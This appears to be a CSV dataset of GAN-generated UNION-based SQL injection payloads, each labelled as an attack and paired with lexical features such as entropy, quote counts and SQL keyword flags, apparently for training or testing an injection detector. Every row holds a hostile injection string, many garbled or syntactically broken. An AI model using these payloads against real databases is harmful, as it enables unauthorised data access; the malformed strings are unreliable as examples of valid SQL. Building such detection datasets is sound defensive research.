label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-4205''  )    )    union all all all * from$where @s,@@V",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,289,56.0,26.0,4.003434386188784,25.0,4.0,16.0,11.0,0.44642857142857145,0.07142857142857142,0.2857142857142857,0.19642857142857142,2.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-1401""  )    )    union all select 1646,6996,9357,1134,6097rs id  1494    )     )    )     )     )     )    union all all select from,9814ers where  @$#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,290,152.0,33.0,3.8941035225443708,47.0,32.0,55.0,18.0,0.3092105263157895,0.21052631578947367,0.3618421052631579,0.11842105263157894,0.0,1.0,1.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-3990""s union 8268$' where   '1'  1 id  1 2011  1 union all all select where @,vrs -- from users id id  =  =  1 u  (   union all select @@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,291,138.0,33.0,4.176778248549543,66.0,17.0,40.0,15.0,0.4782608695652174,0.12318840579710146,0.2898550724637681,0.10869565217391304,3.0,1.0,3.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,1.0,5.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"-)4205 union all union all 1,1646,6996,1249,# null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,292,51.0,18.0,3.953822587231406,20.0,17.0,6.0,8.0,0.39215686274509803,0.3333333333333333,0.11764705882352941,0.1568627450980392,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-4589 union null,1249,1249,1249"",ver,null,null --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,293,49.0,18.0,3.86677636469185,20.0,16.0,3.0,10.0,0.40816326530612246,0.32653061224489793,0.061224489795918366,0.20408163265306123,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-5575""  )    )    union all all all 8268,1249'53496996  )    )  )  )   union all all all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,294,90.0,21.0,3.487696728091182,28.0,21.0,31.0,10.0,0.3111111111111111,0.23333333333333334,0.34444444444444444,0.1111111111111111,1.0,1.0,1.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-3059'   )     )    )     )   e""  )    union all select 4854,4600,1441,5756,5756,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,295,87.0,25.0,3.7803043598808213,15.0,28.0,29.0,15.0,0.1724137931034483,0.3218390804597701,0.3333333333333333,0.1724137931034483,1.0,1.0,3.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,5.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-""  )    union all union null,2263,2263,9357,1297,3059,3059,3059,4266,1441,8986,4300null,1224,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,296,99.0,22.0,4.105865895767554,21.0,52.0,9.0,17.0,0.21212121212121213,0.5252525252525253,0.09090909090909091,0.1717171717171717,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,13.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-oaoowhere ers i  =  1 union all all * from  &&@,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,297,48.0,20.0,3.75204543162196,28.0,1.0,13.0,6.0,0.5833333333333334,0.020833333333333332,0.2708333333333333,0.125,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-""   as   =  1  '1'  )   union all from uers* where id  =  '1' 8268  ('eas where id  8268 or  =  ) union all select null,nullnull,9814,8123,7348,4909,3480,8123,8123,8986,2263,7348,7348,430069969814,4854,4854,9814,3072,3339,4300,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,298,233.0,36.0,4.490191686882612,63.0,95.0,40.0,35.0,0.2703862660944206,0.40772532188841204,0.17167381974248927,0.15021459227467812,5.0,1.0,1.0,0.0,1.0,3.0,0.0,3.0,0.0,0.0,20.0,5.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-4373'+  (  select 'h union all 1,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,299,36.0,22.0,4.093400348604438,15.0,5.0,8.0,8.0,0.4166666666666667,0.1388888888888889,0.2222222222222222,0.2222222222222222,2.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-'  )    )    a    )     )    )    union select 5756,1249,7845,9921,9921,1980,1441,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,300,89.0,25.0,3.7504952087029406,12.0,32.0,29.0,16.0,0.1348314606741573,0.3595505617977528,0.3258426966292135,0.1797752808988764,1.0,0.0,3.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,7.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-53498521')   union * 1494  =  '1' union all null,7845,1224,3059,8665,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,301,75.0,24.0,4.2403829045344335,17.0,33.0,12.0,13.0,0.22666666666666666,0.44,0.16,0.17333333333333334,3.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,5.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-)    union all 1980+,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,302,21.0,14.0,3.463280517810811,8.0,4.0,6.0,3.0,0.38095238095238093,0.19047619047619047,0.2857142857142857,0.14285714285714285,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' $  )    )    j  )   union all all select null,4909,7348,7348,4266,1224,8123,1224,7348,3990,7348,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,303,104.0,27.0,4.174985029475913,22.0,45.0,20.0,17.0,0.21153846153846154,0.4326923076923077,0.19230769230769232,0.16346153846153846,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,11.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-8521'  )    union id  =  '1' a1  @  )   union all select null,null,4300,4266,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,304,83.0,27.0,4.082409249691448,30.0,18.0,22.0,13.0,0.3614457831325301,0.21686746987951808,0.26506024096385544,0.1566265060240964,3.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,4.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack," -3781sunion * fromveid  )    )   union all select 1980,3480,4266,3072,3072,3084,9814,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,305,91.0,30.0,4.462987131720318,28.0,36.0,15.0,12.0,0.3076923076923077,0.3956043956043956,0.16483516483516483,0.13186813186813187,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,7.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-4373t union all @s where i1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,306,28.0,19.0,4.035582047970576,16.0,5.0,5.0,2.0,0.5714285714285714,0.17857142857142858,0.17857142857142858,0.07142857142857142,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-v3084,9814er   )  )   )    b-- union  all  from where usersers versers id  '1'  $  =  78159517 union all select null,null,4300,1224,8123,1441,9357,8665,1249,5756,5756,9814,8123,5756,1224,4300,5756,9814,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,307,208.0,36.0,4.528700684563761,64.0,81.0,33.0,30.0,0.3076923076923077,0.3894230769230769,0.15865384615384615,0.14423076923076922,2.0,0.0,3.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,19.0,4.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-    '+  (  select 'ers union select 7845,3990,6996,6996,6996--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,308,63.0,24.0,4.0463475347420665,20.0,20.0,12.0,11.0,0.31746031746031744,0.31746031746031744,0.19047619047619047,0.1746031746031746,2.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-""    )    union all * @1 users $s where  union @($,3072ers id  =  1980   * boo1  (    )    )    )    )    )   union all bs ion  (    )    )  )    union all all all 1,@@VEERSION ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,309,178.0,37.0,3.695175629570927,67.0,11.0,75.0,25.0,0.37640449438202245,0.06179775280898876,0.42134831460674155,0.1404494382022472,0.0,1.0,1.0,0.0,2.0,1.0,0.0,12.0,0.0,0.0,2.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,-4542 union all all 11all all 1 users us where id  =  (  =  '1'  (    union all select  * 1494,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,310,94.0,25.0,3.7831100688139805,45.0,12.0,29.0,8.0,0.4787234042553192,0.1276595744680851,0.30851063829787234,0.0851063829787234,2.0,0.0,1.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-3997t' union all select null,4854,5756,null,4909,4854,7348,4266,4854,7348#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,311,77.0,24.0,4.193553795580809,23.0,36.0,4.0,14.0,0.2987012987012987,0.4675324675324675,0.05194805194805195,0.18181818181818182,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,3.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-4542 union all from where where ion users )     )    union all all all all all 2446,8986,@@@VEEERSION1249 where  )    )    )    )     )=  =  1 union all all all all all ,2285,9921,9921,2285,9921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,312,197.0,33.0,4.1310961128113375,84.0,37.0,54.0,22.0,0.4263959390862944,0.18781725888324874,0.27411167512690354,0.1116751269035533,0.0,0.0,3.0,0.0,0.0,2.0,0.0,7.0,0.0,0.0,7.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-5575'  )    )    union all select @VEEVRSIunionON  @ 1usis where  =  =  =  1 union all all select 3059,3059,9921,1297,1441,9921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,313,130.0,35.0,4.464498926525325,54.0,30.0,30.0,16.0,0.4153846153846154,0.23076923076923078,0.23076923076923078,0.12307692307692308,1.0,0.0,3.0,0.0,0.0,3.0,0.0,2.0,0.0,0.0,5.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'    )     )   )    )    union all select null,@,7348,4854,9921,1441,9921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,314,76.0,24.0,3.811933975034215,18.0,21.0,23.0,14.0,0.23684210526315788,0.27631578947368424,0.3026315789473684,0.18421052631578946,1.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,6.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6097'  )    )   union all 1494sion  (    )    )    )   =  '1'  1980 union all union from where,vers id  =  =  =  =  1 union all all all all all select from,1249@s,9357,7348,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,315,179.0,36.0,4.117951428757015,71.0,30.0,56.0,22.0,0.39664804469273746,0.16759776536312848,0.3128491620111732,0.12290502793296089,3.0,0.0,1.0,0.0,0.0,5.0,0.0,6.0,0.0,0.0,5.0,6.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,4.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,-5131',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316,6.0,5.0,2.2516291673878226,0.0,4.0,0.0,2.0,0.0,0.6666666666666666,0.0,0.3333333333333333,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-""  )   )    )    union all select  from,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317,43.0,19.0,3.403087003409477,18.0,0.0,17.0,8.0,0.4186046511627907,0.0,0.3953488372093023,0.18604651162790697,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-9860'    s union all all 1980&&er  )    )     )all id  1494    union all * where userk where where   union all fromrsers in  (    )   union all null,--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318,153.0,30.0,3.8761403085202493,78.0,12.0,49.0,14.0,0.5098039215686274,0.0784313725490196,0.3202614379084967,0.0915032679738562,1.0,0.0,3.0,0.0,1.0,0.0,0.0,5.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-3116""  )    )    t'  )    3997   a  )     )    union all all select 1,1249 2263,@@  EEERSSION 1249ION us id  =  =  union 1'$  )   where i1 union 1494 where where usersid  =  =    20111 union all all * uo from @s where id  ,1224,9110,1249,3990IrN@srs 9357eus id  =  =  '1'  )     )     )    union all",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319,300.0,41.0,4.173162188755412,112.0,53.0,102.0,33.0,0.37333333333333335,0.17666666666666667,0.34,0.11,4.0,1.0,1.0,0.0,1.0,6.0,0.0,9.0,0.0,0.0,6.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'  )    )   union all all @ from gounion null,null,4300,null,null,7348,4854,7348,7348,8123,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320,97.0,24.0,4.039180214215066,38.0,29.0,15.0,15.0,0.3917525773195876,0.29896907216494845,0.15463917525773196,0.15463917525773196,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,10.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"6253 select  1,1249,1249,6996,' @@s@&&  I  8890s union us,@@VEVERSIO   e"" union all select 1ersersid  =  =  =        union select select @VEERS)    )    as union all ,7497,4300,4300,2263,5756,null,1441,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321,207.0,37.0,4.562258337853511,83.0,50.0,45.0,29.0,0.40096618357487923,0.24154589371980675,0.21739130434782608,0.14009661835748793,1.0,1.0,0.0,0.0,0.0,3.0,0.0,2.0,0.0,0.0,13.0,5.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,4.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"-""  )    )   union all all select null,9110,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,322,50.0,20.0,3.763418923840168,21.0,8.0,13.0,8.0,0.42,0.16,0.26,0.16,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
